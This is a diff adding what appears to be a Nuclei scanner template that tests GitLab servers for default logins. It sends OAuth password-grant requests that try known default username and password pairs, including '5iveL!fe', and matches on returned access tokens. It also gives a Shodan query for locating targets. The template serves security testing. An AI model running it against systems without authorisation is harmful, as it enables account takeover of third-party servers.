@@ -1,0 +1,60 @@
+id: gitlab-weak-login
+
+info:
+  name: Gitlab Default Login
+  author: Suman_Kar,dwisiswant0
+  severity: high
+  description: Gitlab default login credentials were discovered.
+  reference:
+    - https://twitter.com/0xmahmoudJo0/status/1467394090685943809
+    - https://git-scm.com/book/en/v2/Git-on-the-Server-GitLab
+  classification:
+    cwe-id: CWE-798
+    cpe: cpe:2.3:a:gitlab:gitlab:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 6
+    shodan-query: http.title:"GitLab"
+    product: gitlab
+    vendor: gitlab
+  tags: gitlab,default-login
+
+http:
+  - raw:
+      - |
+        POST /oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Referer: {{BaseURL}}
+        content-type: application/json
+
+        {"grant_type":"password","username":"{{username}}","password":"{{password}}"}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - "root"
+        - "admin"
+        - "admin@local.host"
+      password:
+        - "5iveL!fe"
+        - "123456789"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - application/json
+
+      - type: word
+        part: body
+        words:
+          - '"access_token":'
+          - '"token_type":'
+          - '"refresh_token":'
+        condition: and
+# digest: 490a004630440220184af301bd34396ee9dab6048ad1f2770d0a16dc4620b3d96ca2480c49cc3d1b02200ad3a1bf8f9b181ea7f99aedee68d343e00b0305c6b54a3d3d6c0a7d41bb38af:922c64590222798bb761d5b6d8e72950
